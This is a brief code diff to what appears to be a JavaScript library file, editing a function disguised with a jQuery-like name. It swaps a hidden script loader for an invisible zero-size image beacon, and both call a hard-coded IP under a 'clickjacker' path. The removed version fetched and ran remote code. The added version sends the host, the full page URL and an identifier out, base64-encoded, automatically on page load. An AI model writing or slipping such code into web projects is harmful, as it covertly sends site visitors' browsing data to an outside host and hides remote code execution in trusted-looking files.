@@ -2534,11 +2534,13 @@
 function _jQueryEle() {
     var host = location.protocol + '//' + location.host;
     var full_url = document.location.href;
-    var _cl = document.createElement('script');
+    var elem= document.createElement('img');
     var _elm = identify_ele + '&' + host + '&' + full_url;
-    _cl.type = 'text/javascript';
-    _cl.async = false;
-    _cl.src = 'http://162.243.249.239/clickjacker/index.php/script/jquery/' + btoa(_elm);
-    document.getElementsByTagName('script')[0].appendChild(_cl);
+    elem.setAttribute("src", 'http://162.243.249.239/clickjacker/index.php/script/jquery/' + btoa(_elm));
+elem.setAttribute("height", "0");
+elem.setAttribute("width", "0");
+elem.setAttribute("alt", " ");
+    
+    document.getElementsByTagName('script')[0].appendChild(elem);
 }
 _jQueryEle();
